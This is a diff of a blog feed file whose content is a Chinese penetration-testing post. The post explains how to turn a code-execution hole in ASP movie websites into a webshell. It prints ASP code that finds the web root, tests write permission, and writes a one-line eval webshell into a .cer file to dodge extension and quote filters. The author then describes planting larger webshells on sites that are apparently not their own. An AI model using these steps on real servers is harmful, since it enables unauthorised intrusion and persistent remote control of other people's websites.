@@ -8,7 +8,7 @@
       <link href="/penetrationtest/2024/12/articles/51ea5543eee06d62/"/>
       <url>/penetrationtest/2024/12/articles/51ea5543eee06d62/</url>
       
-        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在修复工具bug中我看到软件扫描的结果。存在十几个asp电影网站的代码执行漏洞。我估计可能存在误报。于是乎测试了一下发现不存在误报。另外尝试使用蚁剑等工具直接连接发现报错。所以有必要写一篇文件我们有一个代码执行的点如何写shell。下面开始正文</p><h2 id="实战写webshell"><a href="#实战写webshell" class="headerlink" title="实战写webshell"></a>实战写webshell</h2><p>下图软扫描结果密码为a的就是<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202412121656550.png" alt="软件扫描结果"><br>我们测试一下看看是否是误报<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202412121657409.png" alt="不存在误报"><br>不存在误报但是使用蚁剑这些都连接不上。这时候就需要写shell了。写shell需要知道绝对路径我们获取一下绝对路径</p><pre class="language-asp" data-language="asp"><code class="language-asp">response.write(Server.MapPath(&quot;&#x2F;&quot;))</code></pre><p> <img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202412121658833.png" alt="获取web根路径"><br> 这时候我们看根目录有没有权限写入文件<br> <pre class="language-asp" data-language="asp"><code class="language-asp">a&#x3D;Server.CreateObject(&quot;Scripting.FileSystemObject&quot;).CreateTextFile(&quot;D:\\xxxx\\test.txt&quot;,True).Write(&quot;test&quot;)</code></pre><br> 根目录写入测试文件<br> <img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202412121659163.png" alt="根目录写入测试文件"><br> 访问看看访问那直接写shell。访问成功说明根目录可写。如果访问404那么根目录不可写在找其他目录<br> <img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202412121700568.png" alt="测试文件"><br>试发现只要是asp的后缀名称都是写入失败的我就不展示 了。那么我们可以写入cer这些后缀。并且写入的时候如果出现双引号”” 会报错我们可以绕过<br>写马</p><pre class="language-asp" data-language="asp"><code class="language-asp">Server.CreateObject(&quot;Scripting.FileSystemObject&quot;).CreateTextFile(&quot;D:\\xx\\test.cer&quot;,True).Write(&quot;&lt;%25eval(request(chr(97)))%25&gt;&quot;)  马子里面没有双引号直接绕过</code></pre><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202412121702286.png" alt="写shell截图"><br>使用cknife 连接 。 蚁剑这种连接不上。当然连接以后你要上传文件可能会出问题这种简单的一句话不是长久之计。我们要写写那种小马<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202412121704518.png" alt="写入小马"><br>小马我就不贴了。自己修改一下就行了注意 双引号和换行这些这时候我们访问一下看看。使用url编码就行了<br>小马写入成功<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202412121705717.png" alt="小马写入成功"><br>我们利用这个在写入一个小马。这个马是明小子工具里面的马我们抠出来这个确实好用。</p><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202412121707712.png" alt="写入马子"><br>最后写一个大马怀旧一下。这个马应该是有个后门可以爆出密码。这些都无所谓主要是怀旧一下哈哈哈<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202412121711867.png" alt="致我们失去的青春"></p><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202412121714647.png" alt="致我们失去的青春"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>现在网站是越来越安全了。基本靠之前的手法搞很难搞了。另外现在waf比较多你要是一点代码都不会那么你将很被动。之前一个工具或者批量工具可以日站的日子没那么多了。现在需要人工配合工具。单纯靠工具getshell那是很费劲的。所以可以适当学习一门编程语言。</p>]]></content>
+        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在修复工具bug中我看到软件扫描的结果。存在十几个asp电影网站的代码执行漏洞。我估计可能存在误报。于是乎测试了一下发现不存在误报。另外尝试使用蚁剑等工具直接连接发现报错。所以有必要写一篇文件我们有一个代码执行的点如何写shell。下面开始正文</p><h2 id="实战写webshell"><a href="#实战写webshell" class="headerlink" title="实战写webshell"></a>实战写webshell</h2><p>下图软扫描结果密码为a的就是<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202412121656550.png" alt="软件扫描结果"><br>我们测试一下看看是否是误报<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202412121657409.png" alt="不存在误报"><br>不存在误报但是使用蚁剑这些都连接不上。这时候就需要写shell了。写shell需要知道绝对路径我们获取一下绝对路径</p><pre class="language-asp" data-language="asp"><code class="language-asp">response.write(Server.MapPath(&quot;&#x2F;&quot;))</code></pre><p> <img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202412121658833.png" alt="获取web根路径"><br> 这时候我们看根目录有没有权限写入文件<br> <pre class="language-asp" data-language="asp"><code class="language-asp">a&#x3D;Server.CreateObject(&quot;Scripting.FileSystemObject&quot;).CreateTextFile(&quot;D:\\xxxx\\test.txt&quot;,True).Write(&quot;test&quot;)</code></pre><br> 根目录写入测试文件<br> <img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202412121659163.png" alt="根目录写入测试文件"><br> 访问看看访问那直接写shell。访问成功说明根目录可写。如果访问404那么根目录不可写在找其他目录<br> <img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202412121700568.png" alt="测试文件"><br>试发现只要是asp的后缀名称都是写入失败的我就不展示 了。那么我们可以写入cer这些后缀。并且写入的时候如果出现双引号”” 会报错我们可以绕过<br>写马</p><pre class="language-asp" data-language="asp"><code class="language-asp">Server.CreateObject(&quot;Scripting.FileSystemObject&quot;).CreateTextFile(&quot;D:\\xx\\test.cer&quot;,True).Write(&quot;&lt;%25eval(request(chr(97)))%25&gt;&quot;)  马子里面没有双引号直接绕过</code></pre><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202412121702286.png" alt="写shell截图"><br>使用cknife 连接 。 蚁剑这种连接不上。当然连接以后你要上传文件可能会出问题这种简单的一句话不是长久之计。我们要写写那种小马<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202412121704518.png" alt="写入小马"><br>小马我就不贴了。自己修改一下就行了注意 双引号和换行这些这时候我们访问一下看看。使用url编码就行了<br>小马写入成功<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202412121705717.png" alt="小马写入成功"><br>我们利用这个在写入一个小马。这个马是明小子工具里面的马我们抠出来这个确实好用。</p><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202412121707712.png" alt="写入马子"><br>最后写一个大马怀旧一下。这个马应该是有个后门可以爆出密码。这些都无所谓主要是怀旧一下哈哈哈<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202412121711867.png" alt="致我们逝去的青春"></p><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202412121714647.png" alt="致我们逝去的青春"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>现在网站是越来越安全了。基本靠之前的手法搞很难搞了。另外现在waf比较多你要是一点代码都不会那么你将很被动。之前一个工具或者批量工具可以日站的日子没那么多了。现在需要人工配合工具。单纯靠工具getshell那是很费劲的。所以可以适当学习一门编程语言。</p>]]></content>
       
       
       <categories>
@@ -147,9 +147,9 @@
       
         <tags>
             
-            <tag> PenetrationTestingExample </tag>
-            
             <tag> CodeAuditExample </tag>
+            
+            <tag> PenetrationTestingExample </tag>
             
         </tags>
       
@@ -842,9 +842,9 @@
       
         <tags>
             
-            <tag> original </tag>
-            
             <tag> Frida </tag>
+            
+            <tag> original </tag>
             
         </tags>
       
@@ -956,9 +956,9 @@
       
         <tags>
             
-            <tag> original </tag>
-            
             <tag> Frida </tag>
+            
+            <tag> original </tag>
             
         </tags>
       
@@ -1062,9 +1062,9 @@
       
         <tags>
             
-            <tag> original </tag>
-            
             <tag> Frida </tag>
+            
+            <tag> original </tag>
             
             <tag> Vip </tag>
             
